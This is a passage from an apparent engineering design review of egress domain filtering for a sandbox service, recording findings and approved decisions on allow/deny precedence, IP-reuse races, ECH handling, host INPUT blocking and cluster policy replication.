- DNS reuse `internal/routedns/responder.go` (miekg/dns, singleflight; binds
  `127.0.0.1:53053`).

---

# Eng review: `/plan-eng-review` 2026-10-05

Target: `plans/egress-domain-filtering.md` (this file). Reviewer: Claude
(plan-eng-review). Branch at review time: `fix/go-race-coverage-tests`.

## Scope record

feature answers: D2 = "Keep in Phase 1" (the `host:port` learned-IP path stays
in Phase 1, together with the fixes that option named: accept established flows
plus conntrack flush on policy narrowing; flush learned entries on Detach and IP
reuse; regression tests for both); structure: B "Original arrangement" (D3:
`pkg/egresspolicy` + `internal/egress` + `internal/egress/dnsfilter` +
`internal/egress/proxy`); accepted scope: the plan as written (Phases 0-4) in
the four-package layout, plus the D2 learned-IP fixes; pending remedies: S1.

Scope Challenge result: scope accepted as-is.

## Decision ledger

### S1: E2B facade mapping of `allowOut` together with `denyOut: ["0.0.0.0/0"]`
Finding: S1, P1, confidence 9/10, `pkg/api/e2b/handlers.go:728-745`, reviewer
plan-eng-review (Claude). The facade turns `denyOut == ["0.0.0.0/0"]` into
`networkBlockAll = true` and then sets `egressAllowOut = nil`. E2B's docs say
"allow rules always take precedence over deny rules" and "When using
domain-based filtering, you must deny all other traffic in denyOut". So every
E2B domain allowlist, and every CIDR allowlist written the E2B way, becomes
block-all. The code comment "allowOut/denyOut are mutually exclusive per the E2B
schema" no longer matches E2B's documented semantics.
Plan baseline: original proposal, P1-9 "The E2B facade accepts hostnames in
`network.allowOut` (Q1). Drop the WASM `notImplemented`". It does not mention
the deny-all mapping.
Runtime evidence: code read only (`handlers.go:728-745`); not probed live. E2B
semantics from docs.e2b.dev/network/internet-access (fetched 2026-10-05).
Comparison grid:

| Choice | Current | A | B | C |
|---|---|---|---|---|
| S1a: `allowOut` non-empty + `denyOut ["0.0.0.0/0"]` | block-all; allow list dropped | allowlist mode (`NetworkAllowOut = allowOut`, not block-all) | allowlist mode | block-all (unchanged), documented limitation |
| S1b: `allowOut` + partial `denyOut` (e.g. `10.0.0.0/8`) | both passed; service 400 "mutually exclusive" | 400 with an E2B-specific message | supported: allow-wins ordering in netrules and the gateway matcher; `validateEgressPolicy` widened | unchanged 400 |
| `denyOut ["0.0.0.0/0"]` with empty `allowOut` | block-all | block-all (unchanged) | block-all (unchanged) | block-all (unchanged) |
| D2 learned-IP path + fixes | approved (D2) | unchanged | unchanged | unchanged |
| D3 four-package layout | approved (D3) | unchanged | unchanged | unchanged |

Question D4:
D4 — How should the E2B facade map allowOut when denyOut is ["0.0.0.0/0"]?
Project/branch/task: eng review of plans/egress-domain-filtering.md (P1-9 E2B facade), branch fix/go-race-coverage-tests.
ELI10: E2B's documented way to write an allowlist is "allow these, deny everything", and E2B says allow wins. Our facade reads "deny everything" as "block all" and throws the allow list away (pkg/api/e2b/handlers.go:728-745). So once hostnames are supported, every E2B user who writes a domain allowlist the documented way gets a sandbox with no internet at all. The same already happens today for CIDR allowlists.
Stakes if we pick wrong: E2B SDK users get silent block-all instead of their allowlist, which reads as "domain filtering is broken".
Recommendation: Allow-wins + 400 mixes because it fixes the documented E2B form with a few lines and keeps our simpler allow-or-deny model.
Completeness: A=8/10, B=10/10, C=3/10
Pros / cons:
A) Allow-wins + 400 mixes (recommended)
  ✅ The documented E2B allowlist form (allow list plus deny all) becomes a real allowlist
  ✅ Small change in handlers.go plus table tests (human: ~2h / CC: ~15min)
  ❌ Rare partial mixes like "deny 10/8 but allow 10.1/16" still get a 400 instead of working
B) Full E2B precedence
  ✅ Every E2B allow/deny combination behaves exactly as E2B documents, including partial mixes
  ✅ No facade-specific 400s for clients migrating from E2B (human: ~2 days / CC: ~2h)
  ❌ Widens the core model to ordered allow-over-deny rules in netrules, gateway and validation
C) Keep current mapping
  ✅ Zero code change; the facade behaves as it does today
  ✅ Nothing new to test or maintain in the facade
  ❌ Every E2B domain allowlist becomes block-all, so the headline feature fails for E2B users
Net: fix the one form E2B tells users to write; leave exotic mixes as a clear 400.
Header: E2B mapping
Options:
A) Allow-wins + 400 mixes (recommended)
In `pkg/api/e2b/handlers.go`: `allowOut` non-empty plus `denyOut ["0.0.0.0/0"]` maps to allowlist mode (`NetworkAllowOut = allowOut`, `NetworkBlockAll = false`, no deny list). `denyOut` all with empty `allowOut` stays block-all. `allowOut` plus a partial `denyOut` returns 400 with an E2B-specific message. Fix the stale "mutually exclusive" comment. Table tests in `pkg/api/e2b`.
B) Full E2B precedence
Support mixed `allowOut` + partial `denyOut` with allow-wins ordering: netrules installs ACCEPTs above DROPs for mixed policies, the gateway matcher checks allow before deny, and `validateEgressPolicy` drops the mutual-exclusion rule. The deny-all form maps to allowlist mode as in A. Tests across netrules, gateway, service and facade.
C) Keep current mapping
No change: `denyOut ["0.0.0.0/0"]` stays block-all and drops `allowOut`. Document in the docs page that the E2B facade does not support allowlists written as allow plus deny-all.

State: approved
Actual answer: B) Full E2B precedence (D4, answered 2026-10-05)
Accepted scope: Mixed `allowOut` + `denyOut` are supported everywhere with allow-wins precedence. Precedence applies only when both lists are present: an allow match accepts, then a deny match drops, then the default is accept (deny-list mode with allow exceptions). `allowOut` alone keeps today's native meaning (allowlist, default deny), and `denyOut` alone keeps today's meaning (deny list, default accept). `denyOut` containing `0.0.0.0/0` together with a non-empty `allowOut` is allowlist mode; `denyOut ["0.0.0.0/0"]` with an empty `allowOut` stays block-all. netrules installs ACCEPTs above DROPs for mixed policies, and `ClearEgressPolicy` removes both. `validateEgressPolicy` drops the mutual-exclusion rule. The `pkg/egresspolicy` matcher checks allow before deny for every consumer. The E2B facade passes both lists through instead of dropping `allowOut`, and its stale "mutually exclusive" comment is fixed. Tests across netrules, gateway, service and facade. Consequence carried with this answer: isolate's current deny-wins order (`internal/runtime/isolate/egress.go`, "Deny wins over allow") flips to allow-wins when isolate moves onto the shared matcher. The `pkg/models` field comments and the docs that say the lists are mutually exclusive are updated. Hostnames stay rejected in deny lists.
History: 2026-10-05 correction. The first recording said "then the default is accept" for every policy. That would have turned native `allowOut`-only allowlists into allow-all. The approved option text never stated a default, so the record now keeps both single-list contracts unchanged. Not re-asked: no behavior the user approved changed.

### S2: learned-IP (`host:port`) lifecycle fixes
Finding: S2, P1, confidence 8/10, plan §5.2 forward rule `ip saddr . ip daddr . th dport ∈ @allow_learned → accept`, §5.4 `timeout = clamp(TTL, 30s, 1h)`, and §5.3 `Detach(id)` (no learned-entry flush stated). Reviewer plan-eng-review (Claude). (1) A per-packet check against an entry that expires at the DNS TTL drops established long-lived connections, such as a git clone over SSH running longer than 30s. Cilium documents the same FQDN-cache-expiry pitfall. (2) Learned entries keyed by source IP outlive the sandbox, and the next sandbox given that IP inherits them. The containerd netns pool returns a destroyed sandbox's slot and IP for reuse (`internal/network/netns/pool.go:94-97`, `Release`).
Plan baseline: original proposal §5.2/§5.4.
Runtime evidence: design-level; netns slot reuse verified in code.
Comparison grid: not needed; covered by D2's selected option text (exact prior approval).
State: approved
Actual answer: D2 B) "Keep in Phase 1", whose description reads "and add the fixes: accept established flows plus conntrack flush on narrowing, and flush learned entries on Detach/IP reuse, with regression tests."
Accepted scope: The forward chain accepts `ct state established,related` for FQDN sources before the learned-set check. Policy narrowing deletes the sandbox's conntrack entries for removed destinations (vishvananda/netlink `ConntrackDeleteFilters`; the dependency already exists). Detach and any IP reuse flush that IP's `allow_learned` entries. Regression tests for both.
History: none

### S3: E2B semantics answer open questions Q1 and Q2 (factual correction)
Finding: S3, informational, confidence 9/10, plan §10 Q1/Q2, reviewer plan-eng-review (Claude). From docs.e2b.dev/network/internet-access (fetched 2026-10-05):
- domains in `allowOut` work for HTTP on port 80 (Host header) and TLS on port 443 (SNI), and other ports are CIDR-only;
- `*.example.com` covers subdomains at any depth but not the apex;
- domains are not supported in deny lists;
- when any domain is used, 8.8.8.8 is auto-allowed;
- `updateNetwork` replaces the egress config.
Plan baseline: Q1 open; Q2 recommends rejecting hostnames in deny lists.
Runtime evidence: external documentation only.
State: recorded (factual correction; no behavior change)
Actual answer: none needed
Accepted scope: Q1 is resolved by these semantics, and the plan's grammar already matches them (wildcard at any depth, apex separate). Q2's rejection of hostnames in deny lists matches E2B. E2B leaves DNS open by auto-allowing 8.8.8.8. This plan's DNS filter is stricter, and E2B clients need no change because all port-53 traffic is redirected.
History: none

### A1: Gateway Detach on a recycled IP
Finding: A1, P1, confidence 9/10, plan line 264 "`Attach(id, ip, policy)` / `Update(id, policy)` / `Detach(id)`" and line 386 "Destroy, stop and die events call `gateway.Detach` next to the existing `ClearEgressPolicy`". Reviewer plan-eng-review (Claude). The containerd netns pool returns a destroyed sandbox's slot and IP for reuse (`internal/network/netns/pool.go:94-97`). If the new owner's Attach runs before the old owner's late Detach, Detach(old) removes the IP from `fqdn_src`. The driver's temporary block is already cleared, so the new sandbox egresses unrestricted (fail-open).
Plan baseline: original proposal, unconditional `Detach(id)`.
Runtime evidence: IP reuse verified in code; the race itself is design-level, not probed.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| A1 Detach semantics | `Detach(id)` removes everything that sandbox registered | `Detach(id, ip)` removes entries only while `bySrc[ip] == id`; `Attach` purges a stale owner of the same IP first | unchanged; 5-min reconcile repairs |
| D2 learned-IP fixes, D3 layout, D4 precedence | approved | unchanged | unchanged |

Question D5:
D5 — Make gateway Detach owner-checked so a recycled IP can't be released by its previous sandbox?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.3/§5.7 gateway lifecycle), branch fix/go-race-coverage-tests.
ELI10: The gateway knows sandboxes by IP, and the containerd netns pool hands a destroyed sandbox's IP to the next sandbox (internal/network/netns/pool.go:95). If the new sandbox attaches before the old sandbox's late cleanup runs, that cleanup removes the IP from the redirect set. The new sandbox's temporary block is already cleared by then, so it ends up with no egress restriction at all.
Stakes if we pick wrong: a sandbox created with a strict allowlist silently gets open internet after an unlucky IP reuse.
Recommendation: Owner-checked Detach because it closes a fail-open race with a compare-before-delete and one regression test.
Completeness: A=10/10, B=4/10
Pros / cons:
A) Owner-checked Detach (recommended)
  ✅ Cleanup removes an IP's entries only while that IP still belongs to the sandbox being cleaned up
  ✅ Attach purges any stale owner's entries for the IP first (human: ~3h / CC: ~20min)
  ❌ Gateway state must track IP ownership per sandbox, one more invariant to keep tested
B) Plain Detach, reconcile repairs
  ✅ Simplest code: Detach(id) removes whatever that sandbox registered, no ownership map
  ✅ Reconcile already reapplies every sandbox's policy every 5 minutes
  ❌ Up to 5 minutes of unrestricted egress for a sandbox that asked for an allowlist
Net: a few lines of ownership checking buy fail-closed behavior on IP reuse.
Header: Detach race
Options:
A) Owner-checked Detach (recommended)
`Detach(id, ip)` removes the `fqdn_src`, CIDR and learned entries and the `bySrc` mapping for `ip` only when `bySrc[ip] == id`. `Attach(id, ip, …)` for an IP still mapped to another sandbox first purges that owner's entries (including learned entries and conntrack) and logs it. Regression test in internal/egress: attach the new owner, then detach the old owner, and assert the new owner is still redirected and restricted.
B) Plain Detach, reconcile repairs
Keep `Detach(id)` unconditional as planned. A late Detach can remove a new owner's entries; the 5-minute reconcile reapplies them. Document the window.

State: approved
Actual answer: A) Owner-checked Detach (D5, answered 2026-10-05)
Accepted scope: `Detach(id, ip)` removes the `fqdn_src`, CIDR and learned entries and the `bySrc` mapping for `ip` only when `bySrc[ip] == id`. `Attach(id, ip, …)` for an IP still mapped to another sandbox first purges that owner's entries (including learned entries and conntrack) and logs it. Regression test in internal/egress: attach the new owner, then detach the old owner, and assert the new owner is still redirected and restricted.
History: none

### A2: Rejecting any ClientHello that carries the ECH extension
Finding: A2, P1, confidence 9/10, plan line 332 "Reject on no SNI, an IP-literal SNI, the ECH extension, or a non-matching SNI" and line 167. Reviewer plan-eng-review (Claude). Chrome and Firefox send a GREASE ECH extension in every ClientHello when they have no ECH config, with the real hostname in the outer SNI. A filter that rejects any hello carrying the extension blocks all Chrome and Firefox TLS traffic (corpus.lantern.io finding on GREASE ECH collateral damage). Sandboxed agents commonly drive headless Chrome (Playwright).
Plan baseline: original proposal, reject on ECH extension presence.
Runtime evidence: external sources (web search 2026-10-05); not probed in this repo.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| A2 ECH handling in the proxy | reject any hello with extension 0xfe0d | match the outer SNI only; ignore the extension | unchanged (reject) |
| DNS filter HTTPS/SVCB → NODATA | planned | unchanged | unchanged |
| D2-D4, A1 | approved / pending | unchanged | unchanged |

Question D6:
D6 — Stop rejecting TLS hellos that merely carry the ECH extension?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.5 SNI proxy), branch fix/go-race-coverage-tests.
ELI10: Encrypted Client Hello can hide the real hostname, so the plan rejects any connection whose hello contains the ECH extension. But Chrome and Firefox add a decoy ECH extension to every hello even when they are not encrypting anything; the real hostname stays visible in the normal SNI field. Rejecting on the extension blocks every Chrome, Firefox and Playwright HTTPS request. Matching the visible SNI is enough: with real ECH, the visible SNI is the provider's public name, so it fails the allowlist anyway.
Stakes if we pick wrong: every browser-driving agent loses HTTPS in FQDN mode, and the feature looks broken on day one.
Recommendation: Match outer SNI only because real ECH already fails the allowlist through its public outer name, while decoy ECH passes.
Completeness: A=9/10, B=3/10
Pros / cons:
A) Match outer SNI only (recommended)
  ✅ Chrome, Firefox and Playwright keep working, since their decoy ECH carries the real outer SNI
  ✅ Real ECH is still denied: its outer SNI is the provider's public name, not on the allowlist
  ❌ An allowlist that names an ECH provider's public name lets hidden inner names through
B) Keep rejecting ECH
  ✅ Simplest rule to state: any hello with the ECH extension is refused outright
  ✅ No reliance on outer-SNI semantics of ECH providers at all
  ❌ Blocks all Chrome and Firefox HTTPS traffic, including every Playwright-driven agent
Net: match the name the client shows; the extension itself is noise.
Header: ECH rule
Options:
A) Match outer SNI only (recommended)
The proxy matches policy on the outer SNI and ignores whether extension 0xfe0d is present. The DNS filter still answers HTTPS/SVCB with NODATA. Update the §4 threat-model row, §5.5 step 2 and EF-07: a GREASE-ECH hello with an allowed outer SNI must pass, and a real-ECH hello whose outer SNI is not allowlisted must be denied. Docs warn against allowlisting ECH providers' public names.
B) Keep rejecting ECH
Keep plan line 332 as written: reject any hello that carries the ECH extension. Document that browser-based agents (Chrome, Firefox, Playwright) cannot use FQDN-mode HTTPS.

State: approved
Actual answer: A) Match outer SNI only (D6, answered 2026-10-05)
Accepted scope: The proxy matches policy on the outer SNI and ignores whether extension 0xfe0d is present. The DNS filter still answers HTTPS/SVCB with NODATA. Update the §4 threat-model row, §5.5 step 2 and EF-07: a GREASE-ECH hello with an allowed outer SNI must pass, and a real-ECH hello whose outer SNI is not allowlisted must be denied. Docs warn against allowlisting ECH providers' public names.
History: none

### A3: FQDN-mode sandboxes can reach every host service (INPUT path)
Finding: A3, P1, confidence 8/10, plan lines 226-227. The input chain drops only "dport ∈ {DNS_PORT, PROXY_PORT} and ip saddr ∉ @fqdn_src". Reviewer plan-eng-review (Claude).
- Every egress rule, in netrules and in the plan's forward chain, sits on the FORWARD hook. netrules installs only a FORWARD jump (`pkg/docker/netrules/ensure_chain.go`).
- Traffic to the host's own bridge IP goes through INPUT instead.
- sandboxd binds `0.0.0.0:21212` (`internal/config/config.go:1626-1627`), the SSH gateway `0.0.0.0:2220` (:1694) and cluster-internal mTLS `0.0.0.0:7002` (:1842).
- A strict-allowlist sandbox can therefore open TCP to all of them through the gateway IP.
- A grep found no sandbox→host TCP callback in toolboxd or the runtimes.
- Host→sandbox connections (sandboxd → toolboxd) return through INPUT, so they need an established/related accept.
Plan baseline: original proposal, input guard on gateway ports only.
Runtime evidence: bind defaults and FORWARD-only hook read in code; reachability not probed live.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| A3 INPUT from FQDN sources | only gateway ports guarded; all other host ports reachable | `ct state established,related accept`; redirected DNS/proxy traffic accept; `ip saddr @fqdn_src drop` | unchanged |
| A4 INPUT for block-all / CIDR sandboxes (netrules) | pending (separate question) | pending | pending |
| D2-D4 approved, A1-A2 pending | — | unchanged | unchanged |

Question D7:
D7 — Should FQDN-mode sandboxes be blocked from reaching host services (sandboxd API, SSH gateway, cluster port)?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.2 input chain), branch fix/go-race-coverage-tests.
ELI10: The firewall rules only cover traffic passing through the host to the internet. Traffic to the host itself takes a different path, and nothing filters it. So a sandbox with a strict allowlist can still connect to sandboxd's API on port 21212, the SSH gateway on 2220 and the cluster port on 7002 through its gateway IP. Blocking that path is a few nft rules, as long as replies to connections the host opens into the sandbox are still allowed.
Stakes if we pick wrong: a "locked down" sandbox can still probe and attack every host service, which undercuts the whole sandbox-that-actually-works pitch.
Recommendation: Drop host INPUT for FQDN sources because default-deny should include the host, and the gateway table already owns an input chain.
Completeness: A=10/10, B=5/10
Pros / cons:
A) Drop host INPUT for FQDN (recommended)
  ✅ An allowlisted sandbox reaches only its allowlist plus the gateway's DNS and proxy ports
  ✅ Lives in the gateway's own input chain, a few rules plus a regression test (human: ~3h / CC: ~20min)
  ❌ Anything inside a sandbox that expected to reach a host-local service breaks in FQDN mode
B) Keep the planned guard
  ✅ No new INPUT policy; host services stay reachable exactly as they are today
  ✅ Zero risk of breaking an undocumented sandbox-to-host dependency
  ❌ A strict allowlist still leaves sandboxd's API, SSH gateway and cluster port reachable
Net: default-deny should mean deny the host too; the established-flow accept keeps host-to-sandbox traffic working.
Header: Host INPUT
Options:
A) Drop host INPUT for FQDN (recommended)
The gateway's input chain accepts `ct state established,related` (replies to host-initiated connections such as sandboxd→toolboxd), accepts redirected traffic to the DNS and proxy ports, then drops everything else from `@fqdn_src`. Regression test: an FQDN-mode sandbox cannot connect to a host listener on its gateway IP, and host→sandbox toolbox calls still work. Docs note it.
B) Keep the planned guard
The input chain only stops non-FQDN sources from reaching the gateway ports. Host services stay reachable from FQDN sandboxes; document it as a limitation.

State: approved
Actual answer: A) Drop host INPUT for FQDN (D7, answered 2026-10-05)
Accepted scope: The gateway's input chain accepts `ct state established,related` (replies to host-initiated connections such as sandboxd→toolboxd), accepts redirected traffic to the DNS and proxy ports, then drops everything else from `@fqdn_src`. Regression test: an FQDN-mode sandbox cannot connect to a host listener on its gateway IP, and host→sandbox toolbox calls still work. Docs note it.
History: none

### A4: Block-all and CIDR-allowlist sandboxes can reach host services today (pre-existing)
Finding: A4, P1, confidence 8/10, same evidence as A3 for existing modes. `BlockAllEgress` and `ApplyEgressPolicy` insert rules only into `DOCKER-USER`/`AEROLVM-USER`, reached only from FORWARD (`pkg/docker/netrules/manager.go:180-211,286-312`; `ensure_chain.go` FORWARD jump). A `network_block_all: true` sandbox can still open TCP to `0.0.0.0`-bound host services through its bridge gateway IP. Reviewer plan-eng-review (Claude).
Plan baseline: not in the plan (pre-existing, not listed in §2.1).
Runtime evidence: code read; not probed live.
Comparison grid:

| Choice | Current | A | B | C |
|---|---|---|---|---|
| A4 INPUT for block-all / CIDR-allowlist sandboxes | unfiltered | Phase 0 item P0-5: netrules gets an INPUT jump into a per-IP chain (established accept, then DROP for block-all/allowlist IPs) + regression test | unchanged; only FQDN mode covered (per A3) | TODOS.md entry, separate PR later |
| A3 FQDN INPUT | pending | unchanged | unchanged | unchanged |

Question D8:
D8 — Also block host services for existing block-all and CIDR-allowlist sandboxes (new Phase 0 item)?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§2.1 pre-existing holes / Phase 0), branch fix/go-race-coverage-tests.
ELI10: The same host-services gap exists today for sandboxes that already use network_block_all or a CIDR allowlist. Their rules only cover traffic leaving the host, so a "blocked" sandbox can still connect to sandboxd's API, the SSH gateway and the cluster port on the host. This is independent of the new FQDN feature; the question is whether this plan fixes it in Phase 0.
Stakes if we pick wrong: customers who rely on network_block_all keep a live path to every host service, and a later audit finds it.
Recommendation: Add as Phase 0 item because block-all should mean block-all, and the fix is a contained netrules change with a regression test.
Completeness: A=10/10, B=5/10, C=6/10
Pros / cons:
A) Add as Phase 0 item (recommended)
  ✅ network_block_all and CIDR allowlists also stop covering for open host services
  ✅ Ships with the other Phase 0 hole fixes, ahead of the new feature (human: ~1 day / CC: ~1h)
  ❌ Behavior change for existing sandboxes: any that relied on reaching a host service now break
B) Only fix FQDN mode
  ✅ No behavior change for existing block-all or CIDR-allowlist sandboxes
  ✅ Keeps this plan focused on the new feature's own guarantees
  ❌ The headline network_block_all mode keeps a known hole to every host service
C) Track as a TODO
  ✅ Captured with context in TODOS.md for a dedicated netrules PR
  ✅ Lets the netrules change get its own review and rollout timing
  ❌ The hole stays open until someone picks the TODO up
Net: the hole is real today; fixing it in Phase 0 is cheap and keeps block-all honest.
Header: INPUT P0
Options:
A) Add as Phase 0 item (recommended)
New P0-5: netrules gains an INPUT jump into a per-IP chain (AEROLVM-INPUT) that accepts `ct state established,related` and drops other traffic from block-all and CIDR-allowlist sandbox IPs, cleaned up with the existing clear paths. Regression test plus an integration UC: a block-all sandbox cannot reach sandboxd's API port on its gateway IP; toolbox calls still work.
B) Only fix FQDN mode
Leave netrules as it is. Existing block-all and CIDR-allowlist sandboxes keep reaching host services. Document it in network-isolation.mdx's limitations.
C) Track as a TODO
Add a TODOS.md entry (What/Why/Context/Start: `pkg/docker/netrules/ensure_chain.go`) and fix it in a separate PR.

State: approved
Actual answer: A) Add as Phase 0 item (D8, answered 2026-10-05)
Accepted scope: New P0-5: netrules gains an INPUT jump into a per-IP chain (AEROLVM-INPUT) that accepts `ct state established,related` and drops other traffic from block-all and CIDR-allowlist sandbox IPs, cleaned up with the existing clear paths. Regression test plus an integration UC: a block-all sandbox cannot reach sandboxd's API port on its gateway IP; toolbox calls still work.
History: none

### A5: In-process gateway and sandboxd restarts
Finding: A5, P2, confidence 8/10, plan lines 287-291 "While sandboxd is down, redirected flows hit closed ports, so FQDN sandboxes fail closed. Live proxied connections drop on a sandboxd restart; out-of-process gateway is Q6." Reviewer plan-eng-review (Claude). Every sandboxd upgrade or restart cuts DNS and HTTP(S) for every FQDN-mode sandbox on the node for the restart window, and kills in-flight downloads. Repo precedent for a same-binary helper process: the WASM worker supervisor (`pkg/wasm/worker/supervisor.go`).
Plan baseline: original proposal (in-process), with Q6 open.
Runtime evidence: design-level.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| A5 gateway process model | in-process, Q6 open | in-process for Phase 1 behind the `Gateway` interface; EF-16 measures the outage window; Q6 closed with an upgrade trigger | separate systemd unit (`sandboxd egress-gateway` subcommand) with policy pushed over a UDS; survives sandboxd restarts; install.sh/Terraform/Ansible units |
| D2-D4 approved, A1-A4 pending | — | unchanged | unchanged |

Question D9:
D9 — Run the egress gateway inside sandboxd, or as its own long-lived process?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.3 placement, Q6), branch fix/go-race-coverage-tests.
ELI10: If the DNS filter and proxy live inside sandboxd, every sandboxd restart or upgrade briefly cuts DNS and web access for every hostname-filtered sandbox on that node, and in-flight downloads fail. A separate process would keep running through sandboxd restarts. But it is a new service to install, upgrade and keep in version sync on every node.
Stakes if we pick wrong: in-process means visible egress blips on every deploy; out-of-process means a new moving part on every node before anyone has asked for it.
Recommendation: In-process for Phase 1 because restarts are operator events, failure is closed rather than open, and the Gateway interface keeps extraction cheap later.
Completeness: A=7/10, B=10/10
Pros / cons:
A) In-process for Phase 1 (recommended)
  ✅ No new binary, unit file, IPC protocol or version skew to manage on every node
  ✅ Same shape as routedns; extraction later only swaps the Gateway implementation
  ❌ Each sandboxd restart drops in-flight proxied connections and DNS for FQDN sandboxes
B) Separate egress process
  ✅ FQDN sandboxes keep DNS and HTTPS through sandboxd upgrades and crashes
  ✅ Gateway failures and sandboxd failures stop sharing fate (human: ~1 week / CC: ~1 day)
  ❌ New systemd unit, install/Terraform/Ansible changes, UDS protocol and version skew to manage
Net: start in-process and fail closed; extract when restart blips show up in real use.
Header: Gateway proc
Options:
A) In-process for Phase 1 (recommended)
Keep the gateway in sandboxd behind the `Gateway` interface. EF-16 measures the outage window on restart. Q6 closes with the upgrade trigger "restart-induced egress failures reported, or sandboxd restart frequency rises". Docs note that FQDN-mode egress pauses during sandboxd restarts.
B) Separate egress process
New `sandboxd egress-gateway` subcommand run by its own systemd unit. sandboxd pushes policy over a UDS; the gateway rebuilds from a policy snapshot on its own restart. install.sh, Terraform and Ansible ship the unit, and version-skew handling between sandboxd and the gateway is added.

State: approved
Actual answer: B) Separate egress process (D9, answered 2026-10-05)
Accepted scope: New `sandboxd egress-gateway` subcommand run by its own systemd unit. sandboxd pushes policy over a UDS; the gateway rebuilds from a policy snapshot on its own restart. install.sh, Terraform and Ansible ship the unit, and version-skew handling between sandboxd and the gateway is added. Q6 is closed by this answer. (The D3 four-package layout is unchanged; the packages run inside the new process.)
History: none

### A6: Cluster spec replication for a policy PUT is best-effort
Finding: A6, P2, confidence 9/10. Plan line 430 uses `replicateSpecPatch`. `internal/service/cluster_secrets.go:19-45` documents it as "a best-effort write-through … on failure it warns and returns without surfacing the error". If a narrowed policy's spec write fails, the FSM keeps the looser policy, and a failover recreate rebuilds from the replicated spec (`RecreateSandbox`, `internal/service/service.go:1309-1375`), which restores the looser policy. Reviewer plan-eng-review (Claude).
Plan baseline: original proposal §5.8 step 5 (best-effort `replicateSpecPatch`).
Runtime evidence: code read.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| A6 PUT replication | best-effort, local apply regardless | spec-first and strict: commit via `UpsertSpec` with the error surfaced; on failure return 503 and apply nothing; on success apply locally (local failure → block-all + 503 as planned) | unchanged (best-effort) |
| D2-D4 and A1-A5 (answered D5-D9) | approved | unchanged | unchanged |

Question D10:
D10 — Must a cluster policy update reach the replicated spec before it counts as done?
Project/branch/task: eng review of plans/egress-domain-filtering.md (§5.8 live update, cluster mode), branch fix/go-race-coverage-tests.
ELI10: In cluster mode each sandbox's settings are also copied into the cluster's shared record, so another node can rebuild it after a failure. The plan copies the new policy with an existing helper that ignores errors. If that copy fails, the API still says OK, and after a failover the sandbox comes back with its old, looser policy.
Stakes if we pick wrong: a customer tightens a sandbox's allowlist, gets 200 OK, and a later node failure silently restores the old allowlist.
Recommendation: Spec-first and strict because a 2xx should mean both the cluster record and the live sandbox carry the new policy.
Completeness: A=10/10, B=5/10
Pros / cons:
A) Spec-first and strict (recommended)
  ✅ A 2xx guarantees the cluster record and the live firewall both hold the new policy
  ✅ A failed commit changes nothing, and the client retries the idempotent PUT (human: ~3h / CC: ~20min)
  ❌ PUT latency includes a Raft commit (up to 5s timeout) and fails during Raft unavailability
B) Best-effort, as planned
  ✅ PUT works even while Raft is unavailable, and stays fast on single-node-like paths
  ✅ Matches how resize and lifecycle updates already replicate
  ❌ A failover can silently restore an older, looser policy after a successful-looking PUT
Net: security policy should not be best-effort; pay one Raft commit per policy change.
Header: Spec commit
Options:
A) Spec-first and strict (recommended)
In cluster mode `UpdateNetworkPolicy` commits the patched spec through `Cluster.UpsertSpec` with the error returned, before any local apply. A commit failure returns 503 and changes nothing; on success it applies locally (a local apply failure leaves block-all + 503, as planned). Single-node (Noop cluster) is unchanged. Test: an UpsertSpec failure leaves local rules and the row untouched and returns 503.
B) Best-effort, as planned
Keep §5.8 step 5: store write, best-effort `replicateSpecPatch`, local apply. Document that a failover after a failed write-through can restore the previous policy.

State: approved
Actual answer: A) Spec-first and strict (D10, answered 2026-10-05)
Accepted scope: In cluster mode `UpdateNetworkPolicy` commits the patched spec through `Cluster.UpsertSpec` with the error returned, before any local apply. A commit failure returns 503 and changes nothing; on success it applies locally (a local apply failure leaves block-all + 503, as planned). Single-node (Noop cluster) is unchanged. Test: an UpsertSpec failure leaves local rules and the row untouched and returns 503.
History: none

### A7: E2B facade treats `allowOut` alone as an allowlist (stricter than E2B)
Finding: A7, P3, confidence 8/10. E2B's docs say allow takes precedence and internet access is on by default, so `allowOut` with no `denyOut` restricts nothing in E2B. The facade passes `allowOut` alone to the native allowlist, which defaults to deny (`pkg/api/e2b/handlers.go:706`, `:740` `egressAllowOut := networkAllowOut`). This is pre-existing and fail-safe; after D4 it is the remaining semantic difference from E2B. Reviewer plan-eng-review (Claude).
Plan baseline: not addressed in the plan.
Runtime evidence: code read.
Comparison grid:

| Choice | Current | A | B |
|---|---|---|---|
| A7 E2B `allowOut` without `denyOut` | native allowlist (default deny) | unchanged; documented on the new docs page as stricter than E2B | matches E2B: `allowOut` ignored when `denyOut` is empty (no restriction) |
| D4 precedence | approved | unchanged | unchanged |

Question D11:
D11 — Keep the facade's stricter reading of E2B allowOut-only requests, or match E2B exactly?
Project/branch/task: eng review of plans/egress-domain-filtering.md (P1-9 E2B facade), branch fix/go-race-coverage-tests.
ELI10: In E2B, a list of allowed destinations with no deny list does nothing, because everything is allowed by default. Our facade treats that same request as "only these destinations", which is stricter. Matching E2B exactly would quietly open up any existing E2B-facade sandbox that relies on the stricter reading.
Stakes if we pick wrong: matching E2B loosens existing sandboxes without anyone asking; keeping it means a migrating E2B user may see tighter egress than they expected.
Recommendation: Keep stricter and document because failing safe beats silent loosening, and docs make the difference visible.
Note: options differ in kind, not coverage — no completeness score.
Pros / cons:
A) Keep stricter, document (recommended)
  ✅ No existing E2B-facade sandbox becomes less restricted after this change ships
  ✅ One paragraph on the new docs page, no code change
  ❌ An E2B user who sends allowOut alone gets an allowlist where E2B would allow everything
B) Match E2B exactly
  ✅ Byte-for-byte E2B semantics for every allow and deny combination
  ✅ Migrating E2B users see exactly the behavior E2B documents
  ❌ Silently loosens existing facade sandboxes that send allowOut without denyOut
Net: fail safe and document the difference.
Header: allowOut only
Options:
A) Keep stricter, document (recommended)
No code change. The new egress docs page states that the E2B facade treats `allowOut` without `denyOut` as an allowlist (stricter than E2B), and that `allowOut` plus `denyOut ["0.0.0.0/0"]` is the portable form.
B) Match E2B exactly
